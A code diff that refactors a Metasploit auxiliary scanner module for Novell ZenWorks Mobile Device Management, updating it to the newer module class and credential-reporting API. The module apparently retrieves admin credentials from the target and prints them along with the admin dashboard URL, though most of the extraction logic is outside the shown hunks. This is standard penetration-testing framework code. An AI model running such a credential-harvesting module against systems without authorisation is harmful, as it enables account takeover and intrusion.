@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -34,11 +31,11 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/'])
-    ], self.class)
+    ])
 
     register_advanced_options([
       OptBool.new('SSL', [true, "Negotiate SSL connection", false])
-    ], self.class)
+    ])
   end
 
   def setup_session()
@@ -77,6 +74,32 @@ class Metasploit3 < Msf::Auxiliary
     return creds.split(":")
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: 'novellmdm',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run_host(ip)
     print_status("Verifying that Zenworks login page exists at #{ip}")
     uri = normalize_uri(target_uri.path)
@@ -97,14 +120,7 @@ class Metasploit3 < Msf::Auxiliary
         print_good("Got creds. Login:#{user} Password:#{pass}")
         print_good("Access the admin interface here: #{ip}:#{rport}#{target_uri.path}dashboard/")
 
-        report_auth_info(
-          :host => ip,
-          :port => rport,
-          :sname => "novellmdm",
-          :user => user,
-          :pass => pass,
-          :active => true
-        )
+        report_cred(ip: ip, port: rport, user: user, password: pass, proof: res.body)
       else
         print_error("Zenworks MDM does not appear to be running at #{ip}")
         return :abort
@@ -116,5 +132,4 @@ class Metasploit3 < Msf::Auxiliary
       return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
     end
   end
-
 end
